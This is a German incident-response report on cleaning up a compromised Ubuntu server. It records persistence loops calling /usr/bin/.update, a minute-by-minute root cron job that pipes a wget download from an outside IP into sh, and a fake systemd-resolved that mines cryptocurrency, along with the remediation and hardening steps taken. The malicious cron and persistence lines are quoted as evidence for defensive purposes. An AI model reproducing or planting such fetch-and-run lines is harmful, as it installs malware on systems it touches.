# Aenderungsdokumentation Server 217.160.74.128

Stand: 2026-04-22

## Anlass

Auf dem Server erschien bei jeder Anmeldung die Fehlermeldung:

`/etc/profile: line 31: /usr/bin/.update: No such file or directory`

Im Rahmen der Analyse wurden weitere Hinweise auf eine kompromittierte oder manipulierte Serverkonfiguration gefunden. Die unten dokumentierten Aenderungen wurden unmittelbar zur Eindämmung, Bereinigung und Stabilisierung vorgenommen.

## Ziel der Arbeiten

- Fehler in der Login-Shell beseitigen
- aktive Persistenzmechanismen identifizieren und entfernen
- DNS-Aufloesung und Paketverwaltung wiederherstellen
- ausstehende Sicherheits- und Systemupdates einspielen
- den aktuellen Zustand fuer die weitere Serverhaertung dokumentieren

## Zusammenfassung der Befunde

### 1. Defekte und manipulative Persistenz ueber /usr/bin/.update

Es existierten mehrere Eintraege, die auf die nicht vorhandene Datei `/usr/bin/.update` verwiesen.

Betroffene Stellen:

- `/etc/profile`
- `/etc/cron.d/root`
- `/etc/rc.local`
- `/etc/init.d/rcS`
- `/etc/init.d/boot.local`
- `/etc/inittab`
- auskommentierter Rest in `/root/.bashrc`

Typische Eintraege waren Schleifen wie:

- `while true; do /usr/bin/.update startup & sleep 30; done &`
- Cron-/Respawn-Eintraege mit `/usr/bin/.update startup`

### 2. Aktive Malware-Nachladung ueber Root-Cron

Im Root-Crontab war ein aktiver Nachladebefehl eingetragen:

- `* * * * * wget -q -O - http://80.64.16.241/unk.sh | sh > /dev/null 2>&1`

Dieser Befehl wurde jede Minute ausgefuehrt und startete fortlaufend neue Shell- und wget-Prozesse.

### 3. Manipulierter DNS-Dienst

`systemd-resolved` war durch eine manipulierte Unit-Datei ersetzt worden.

Manipulierte Service-Definition:

- `/etc/systemd/system/systemd-resolved.service`

Manipulierter Startpfad:

- `/root/.systemd/systemd-resolved --config=/root/.systemd/config.json`

Im Dienststatus wurden minerartige bzw. eindeutig unpassende Ausgaben sichtbar, darunter:

- `POOL #1 auto.4thepool.lol:80`
- `DONATE 1%`

Zusaetzlich fehlte eine funktionierende `/etc/resolv.conf`, wodurch Paketquellen zeitweise nicht mehr per DNS aufgeloest werden konnten.

### 4. SSH-/Auth-Logs

In den Logs waren mehrere externe Angriffsversuche sichtbar, darunter Root-Bruteforce-Versuche und Logins auf Standard-Benutzernamen.

Erfolgreiche Root-Logins am 2026-04-22 wurden nur von folgender IP gesehen:

- `91.36.254.207`

Aeltere erfolgreiche Root-Logins aus Dezember 2025 kamen von:

- `37.4.255.68`

Weitere externe Scans bzw. Fehlversuche kamen unter anderem von:

- `2.57.122.194`
- `2.57.122.197`
- `2.57.122.193`
- `2.57.122.191`
- `213.169.44.220`
- `118.123.116.93`
- `95.79.108.51`
- `139.19.117.130`
- `2.57.121.112`
- `219.159.57.4`
- `213.209.159.159`
- `45.178.227.0`

## Durchgefuehrte Aenderungen

### A. Bereinigung der fehlerhaften .update-Persistenz

Die verwaisten bzw. manipulativen Eintraege mit Bezug zu `/usr/bin/.update` wurden entfernt.

Konkret:

- Schleife aus `/etc/profile` entfernt
- Eintrag aus `/etc/cron.d/root` entfernt
- Eintraege aus `/etc/rc.local`, `/etc/init.d/rcS` und `/etc/init.d/boot.local` entfernt
- Eintrag aus `/etc/inittab` entfernt
- auskommentierten Rest aus `/root/.bashrc` bereinigt

Leere Shell-Skripte wurden, wo noetig, auf ein minimales gueltiges Format zurueckgesetzt:

- `#!/bin/sh`
- `exit 0`

### B. Backup der bereinigten Persistenzdateien

Vor den Eingriffen wurde ein Backup der betroffenen Dateien erstellt unter:

- `/root/update_persistence_backup_2026-04-22-105221`

### C. Entfernung des boesartigen Root-Crontabs

Der aktive Root-Crontab mit dem Nachladebefehl auf `http://80.64.16.241/unk.sh` wurde entfernt.

Backup des Root-Crontabs wurde erstellt.

Ergebnis nach der Entfernung:

- Root-Crontab leer
- keine neue Nachladung mehr ueber Cron

### D. Beendigung laufender Nachladeprozesse

Bereits gestartete Prozesse mit Bezug auf `unk.sh` bzw. `80.64.16.241` wurden gezielt beendet.

Ergebnis nach der Bereinigung:

- keine laufenden `wget`-/Shell-Prozesse mehr mit Bezug auf `80.64.16.241`
- keine laufenden Prozesse mehr mit Bezug auf `unk.sh`
- keine laufenden Prozesse mehr mit Bezug auf `4thepool.lol`

### E. Wiederherstellung des echten systemd-resolved

Es wurde festgestellt, dass `systemd-resolved` nicht aus dem Systempfad lief, sondern aus einem manipulierten Binary unter `/root/.systemd/`.

Massnahmen:

- manipulierte Unit-Datei aus `/etc/systemd/system/systemd-resolved.service` deaktiviert und aus dem Live-Pfad entfernt
- DNS-Konfiguration unter `/etc/systemd/resolved.conf.d/99-upstream-dns.conf` gesetzt
- `systemd-resolved` neu geladen und sauber gestartet
- `/etc/resolv.conf` wieder an die Resolver-Datei angebunden
- pruefbare DNS-Lookups auf Ubuntu-Repositories wiederhergestellt

Gesetzte Upstream-DNS-Server:

- `1.1.1.1`
- `8.8.8.8`
- Fallback: `1.0.0.1`, `8.8.4.4`

Validierter Endzustand:

- laufender Resolver aus `/usr/lib/systemd/systemd-resolved`
- keine aktive Resolver-Ausfuehrung mehr aus `/root/.systemd`
- funktionierende Namensaufloesung fuer `archive.ubuntu.com`, `security.ubuntu.com`, `download.docker.com`, `deb.nodesource.com`

### F. Quarantaene der Resolver-Malware-Artefakte

Manipulierte Resolver-Artefakte wurden aus dem aktiven Pfad entfernt und quarantanisiert:

- `/root/.systemd.quarantined-2026-04-22-111952`
- `/root/systemd-resolved.service.malicious-2026-04-22-111339`

Zusaetzliches Backup der Resolver-Artefakte:

- `/root/resolver-malware-backup-2026-04-22-111339`

### G. System- und Sicherheitsupdates

Nach Wiederherstellung der DNS-Aufloesung wurden die ausstehenden Paketupdates eingespielt.

Upgrade-Ergebnis:

- `62` Pakete aktualisiert
- `0` neu installiert
- `0` entfernt
- `0` zurueckgehalten

Unter anderem aktualisiert:

- `systemd`
- `systemd-resolved`
- `systemd-sysv`
- `udev`
- `snapd`
- `cloud-init`
- `rsyslog`
- `apparmor`
- `docker-ce`, `containerd.io`, Docker-Plugins
- `nodejs`
- `initramfs-tools`

### H. Reboot-Pruefung nach Upgrade

Gepruefter Zustand:

- keine Datei `/var/run/reboot-required`
- kein erzwungener Neustart notwendig

## Validierungen nach den Aenderungen

Folgende Zustandspruefungen wurden erfolgreich durchgefuehrt:

- frischer SSH-Login ohne Fehlermeldung aus `/etc/profile`
- keine aktiven Referenzen mehr auf `/usr/bin/.update` in den bereinigten Systemdateien
- Root-Crontab leer
- keine laufenden Prozesse mit Bezug auf `80.64.16.241`, `unk.sh` oder `4thepool.lol`
- Resolver-Prozess stammt aus `/usr/lib/systemd/systemd-resolved`
- Paketquellen wieder per DNS erreichbar
- `apt`-Upgrade erfolgreich abgeschlossen
- keine verbleibenden upgradierbaren Pakete in der Abschlusspruefung sichtbar

## Nebenbefunde

### 1. Festplattenbelegung

Vor dem Upgrade war `/` stark ausgelastet:

- etwa `93%` Nutzung auf `/`

Das sollte weiterhin beobachtet und mittelfristig bereinigt oder vergroessert werden.

### 2. Alter Serverzustand

Die Kombination aus:

- manipulativen Login-/Cron-/Init-Eintraegen
- boesartigem Resolver-Ersatz
- aktiver Remote-Nachladung per `wget | sh`

ist ein starker Hinweis darauf, dass der Server als kompromittiert behandelt werden muss.

## Offene Restrisiken

Trotz der erfolgreichen Bereinigung verbleiben sicherheitsrelevante Restrisiken:

- nicht ausgeschlossen, dass weitere Persistenzmechanismen vorhanden sind
- nicht ausgeschlossen, dass weitere Benutzer, SSH-Schluessel oder Dienste manipuliert wurden
- nicht ausgeschlossen, dass bereits zusaetzliche Binaries, Skripte oder Konfigurationen veraendert wurden
- Root-Login per Passwort ist nach wie vor grundsaetzlich ein Angriffsziel

## Empfohlene naechste Schritte

### Dringend

1. Root-Passwort sofort aendern.
2. Alle vorhandenen SSH-Schluessel pruefen und unnoetige Schluessel entfernen.
3. Root-Login per SSH deaktivieren.
4. Einen separaten Admin-Benutzer mit sudo anlegen.
5. Firewall und Fail2ban aktivieren.

### Fachlich sauberste Option

1. Server komplett neu aufsetzen und nur saubere, verifizierte Daten wieder einspielen.

### Falls keine sofortige Neuinstallation moeglich ist

1. Weitere Persistenzstellen systematisch pruefen, z. B.:
   - systemd Units und Timer
   - Benutzerkonten und autorisierte SSH-Schluessel
   - `/usr/local/bin`, `/opt`, `/var/tmp`, `/tmp`
   - PM2, Docker-Container, Node-Prozesse, rc-Skripte
   - Netzwerk- und Outbound-Verbindungen

## Status nach Abschluss dieser Arbeiten

Der urspruengliche Konsolenfehler ist beseitigt.

Der Server ist aktuell:

- loginfaehig ohne `/etc/profile`-Fehler
- DNS-funktional
- paketaktuell fuer die zuletzt sichtbaren Updates
- frei von der konkret nachgewiesenen `unk.sh`-Cron-Nachladung
- frei von der konkret nachgewiesenen `.update`-Persistenz

Gleichzeitig ist der Server aufgrund der gefundenen Manipulationen weiterhin als sicherheitskritisch einzustufen, bis eine vollstaendige Haertung oder Neuinstallation erfolgt ist.
